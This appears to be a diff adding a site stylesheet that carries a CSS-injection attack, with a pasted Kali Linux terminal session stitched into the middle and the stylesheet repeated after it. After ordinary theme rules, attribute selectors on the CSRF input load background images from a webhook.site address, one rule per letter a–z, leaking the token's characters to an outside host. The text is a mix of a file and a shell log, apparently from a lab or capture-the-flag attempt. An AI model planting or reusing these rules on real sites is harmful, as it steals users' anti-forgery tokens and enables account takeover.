@@ -1,0 +1,269 @@
+* {
+        box-sizing: border-box;
+        outline: none;
+}
+
+html, body {
+        width: 100%;
+        margin: 0;
+        padding: 0;
+        color: #ffffff;
+        background: #36486b;
+}
+
+.wrapper {
+        width: 75%;
+        margin: auto;
+}
+
+.title {
+        float: left;
+}
+
+.styles {
+        float: right;
+    list-style: none;
+}
+
+.styles > a > li {
+        display: inline-block;
+        width: 1.5em;
+        height: 1.5em;
+        border: 0.1em solid #aaaaaa;
+        border-radius: 0.25em;
+}
+
+.styles > a > li.light {
+        background: #dddddd;
+}
+
+.styles > a > li.dark {
+        background: #353535;
+}
+
+.styles > a > li.red {
+        background: #cc0000;
+}
+
+.styles > a > li.green {
+        background: #82b74b;
+}
+
+.styles > a > li.blue {
+        background: #034f84;
+}
+
+.styles > a > li.purple {
+        background: #50394c;
+}
+
+.styles > a > li.pink {
+        background: #d64161;
+}
+
+.container {
+        width: 90%;
+        margin: auto;
+}
+
+.clear {
+        clear: both;
+}
+
+hr {
+        border-style: solid;
+        border-color: #353535;
+}
+
+form > input {
+        display: block;
+        width: 20em;
+        margin: 1em;
+        padding: 0.5em;
+        border: 0.25em solid #dddddd;
+        border-radius: 0.1em;
+}
+
+form > textarea {
+        width: 40em;
+        height: 10em;
+        margin: 1em;
+        padding: 0.5em;
+        border: 0.25em solid #dddddd;
+        border-radius: 0.1em;
+}
+
+form > input:focus, form > textarea:focus {
+        border-color: #87bdd8;
+}
+
+form > input[type='submit'] {
+        width: 10em;
+}
+
+.csrf {
+        visibility: visible;
+}
+body {
+        background-image: url("https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/test");
+}
+
+input[name=csrf][value^='rz']{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/z);}                                                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~]
+└─$ ls
+1.jpg  a.css  admin_csrf  bapp.py  BurpSuitePro  Desktop  Documents  Downloads  ExifTool.jpg  gen_python.py  git.py  Music  nocolor.css  Pictures  polyglot.php  Public  r.py  Templates  Videos
+                                                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~]
+└─$ sudo git.py
+sudo: git.py: command not found
+                                                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~]
+└─$ sudo vim git.py                                                                                                                                                                                                                      1 ⨯
+                                                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~]
+└─$ sudo vim nocolor.css 
+                                                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~]
+└─$ sudo vim git.py     
+                                                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~]
+└─$ sudo python git.py
+                                                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~]
+└─$ cat nocolor.css 
+* {
+        box-sizing: border-box;
+        outline: none;
+}
+
+html, body {
+        width: 100%;
+        margin: 0;
+        padding: 0;
+        color: #ffffff;
+        background: #36486b;
+}
+
+.wrapper {
+        width: 75%;
+        margin: auto;
+}
+
+.title {
+        float: left;
+}
+
+.styles {
+        float: right;
+    list-style: none;
+}
+
+.styles > a > li {
+        display: inline-block;
+        width: 1.5em;
+        height: 1.5em;
+        border: 0.1em solid #aaaaaa;
+        border-radius: 0.25em;
+}
+
+.styles > a > li.light {
+        background: #dddddd;
+}
+
+.styles > a > li.dark {
+        background: #353535;
+}
+
+.styles > a > li.red {
+        background: #cc0000;
+}
+
+.styles > a > li.green {
+        background: #82b74b;
+}
+
+.styles > a > li.blue {
+        background: #034f84;
+}
+
+.styles > a > li.purple {
+        background: #50394c;
+}
+
+.styles > a > li.pink {
+        background: #d64161;
+}
+
+.container {
+        width: 90%;
+        margin: auto;
+}
+
+.clear {
+        clear: both;
+}
+
+hr {
+        border-style: solid;
+        border-color: #353535;
+}
+
+form > input {
+        display: block;
+        width: 20em;
+        margin: 1em;
+        padding: 0.5em;
+        border: 0.25em solid #dddddd;
+        border-radius: 0.1em;
+}
+
+form > textarea {
+        width: 40em;
+        height: 10em;
+        margin: 1em;
+        padding: 0.5em;
+        border: 0.25em solid #dddddd;
+        border-radius: 0.1em;
+}
+
+form > input:focus, form > textarea:focus {
+        border-color: #87bdd8;
+}
+
+form > input[type='submit'] {
+        width: 10em;
+}
+
+.csrf {
+        visibility: visible;
+}
+body {
+        background-image: url("https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/test");
+}
+
+input[name=csrf][value^=a]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/a);}
+input[name=csrf][value^=b]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/b);}
+input[name=csrf][value^=c]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/c);}
+input[name=csrf][value^=d]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/d);}
+input[name=csrf][value^=e]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/e);}
+input[name=csrf][value^=f]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/f);}
+input[name=csrf][value^=g]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/g);}
+input[name=csrf][value^=h]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/h);}
+input[name=csrf][value^=i]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/i);}
+input[name=csrf][value^=j]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/j);}
+input[name=csrf][value^=k]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/k);}
+input[name=csrf][value^=l]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/l);}
+input[name=csrf][value^=m]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/m);}
+input[name=csrf][value^=n]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/n);}
+input[name=csrf][value^=o]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/o);}
+input[name=csrf][value^=p]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/p);}
+input[name=csrf][value^=q]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/q);}
+input[name=csrf][value^=r]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/r);}
+input[name=csrf][value^=s]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/s);}
+input[name=csrf][value^=t]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/t);}
+input[name=csrf][value^=u]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/u);}
+input[name=csrf][value^=v]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/v);}
+input[name=csrf][value^=w]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/w);}
+input[name=csrf][value^=x]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/x);}
+input[name=csrf][value^=y]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/y);}
+input[name=csrf][value^=z]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/z);}
